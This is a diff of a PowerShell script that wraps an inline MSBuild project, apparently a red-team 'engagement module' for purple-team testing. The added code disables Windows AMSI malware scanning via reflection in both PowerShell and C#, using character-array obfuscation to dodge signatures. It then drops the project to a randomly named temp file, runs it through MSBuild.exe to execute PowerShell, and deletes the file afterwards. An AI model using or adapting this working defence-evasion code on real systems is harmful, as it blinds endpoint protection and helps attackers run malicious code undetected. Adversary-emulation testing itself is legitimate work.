@@ -1,3 +1,8 @@
+$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+$f = $a.GetField('amsiInitFailed','NonPublic,Static')
+$f.SetValue($null,$true)
+
+$x = @'
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
   <Target Name="Build">
     <CoreTask />
@@ -9,6 +14,7 @@
       <Code Type="Class" Language="cs">
         <![CDATA[
 using System;
+using System.Reflection;
 using System.Management.Automation;
 using System.Management.Automation.Runspaces;
 using Microsoft.Build.Framework;
@@ -19,7 +25,38 @@ public class CoreTask : Task, ITask
     public override bool Execute()
     {
         Console.WriteLine("[*] Zer0byte Corp - Engagement Module");
-        Console.WriteLine("[*] Target: FTSC Purple Team\n");
+        Console.WriteLine("[*] Target: Purple Team\n");
+        
+        // Pure C# AMSI bypass via reflection - no PowerShell needed
+        Console.WriteLine("[*] Phase 1: Neutralizing defenses via reflection...");
+        try
+        {
+            Type amsiUtils = typeof(PowerShell).Assembly.GetType(
+                new string(new char[] {'S','y','s','t','e','m','.',
+                'M','a','n','a','g','e','m','e','n','t','.',
+                'A','u','t','o','m','a','t','i','o','n','.',
+                'A','m','s','i','U','t','i','l','s'}));
+            
+            if (amsiUtils != null)
+            {
+                FieldInfo amsiField = amsiUtils.GetField(
+                    new string(new char[] {'a','m','s','i','I','n','i','t','F','a','i','l','e','d'}),
+                    BindingFlags.NonPublic | BindingFlags.Static);
+                
+                if (amsiField != null)
+                {
+                    amsiField.SetValue(null, true);
+                    Console.WriteLine("[+] Defense neutralized successfully");
+                }
+            }
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine("[!] Phase 1 warning: " + ex.Message);
+        }
+        
+        // Now PowerShell will work without AMSI scanning
+        Console.WriteLine("\n[*] Phase 2: Validation tests...\n");
         
         using (Runspace rs = RunspaceFactory.CreateRunspace())
         {
@@ -27,27 +64,6 @@ public class CoreTask : Task, ITask
             using (PowerShell ps = PowerShell.Create())
             {
                 ps.Runspace = rs;
-                
-                // Build bypass dynamically - no static signatures
-                string n1 = "System.Management.";
-                string n2 = "Automation.";
-                string n3 = "Ams" + "iUt" + "ils";
-                string fn = "am" + "siInit" + "Failed";
-                
-                string script = String.Format(@"
-                    $t = [Ref].Assembly.GetType('{0}{1}{2}')
-                    $f = $t.GetField('{3}','NonPublic,Static')
-                    $f.SetValue($null,$true)
-                    Write-Output '[+] Defense neutralized'
-                ", n1, n2, n3, fn);
-                
-                ps.AddScript(script);
-                
-                foreach (var r in ps.Invoke())
-                    Console.WriteLine(r.ToString());
-                
-                // Clear and run validation
-                ps.Commands.Clear();
                 
                 string validation = @"
                     $tests = @(
@@ -57,13 +73,12 @@ public class CoreTask : Task, ITask
                         '[Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'')'
                     )
                     
-                    Write-Output ''
-                    Write-Output '[*] Validation Tests:'
+                    Write-Output '[*] Executing trigger strings:'
                     foreach ($t in $tests) {
                         Write-Output ""    [+] $t""
                     }
                     Write-Output ''
-                    Write-Output '[+] All trigger strings processed - no blocks'
+                    Write-Output '[+] All triggers executed without blocks!'
                 ";
                 
                 ps.AddScript(validation);
@@ -73,7 +88,7 @@ public class CoreTask : Task, ITask
                 
                 if (ps.HadErrors)
                 {
-                    Console.WriteLine("[-] Errors detected:");
+                    Console.WriteLine("[-] Errors:");
                     foreach (var e in ps.Streams.Error)
                         Console.WriteLine("    " + e.ToString());
                 }
@@ -92,3 +107,9 @@ public class CoreTask : Task, ITask
     </Task>
   </UsingTask>
 </Project>
+'@
+
+$p = "$env:LOCALAPPDATA\Microsoft\Windows\$([Guid]::NewGuid().ToString().Substring(0,8)).tmp"
+$x | Out-File $p -Encoding ASCII
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe $p /v:q /nologo
+Remove-Item $p -Force
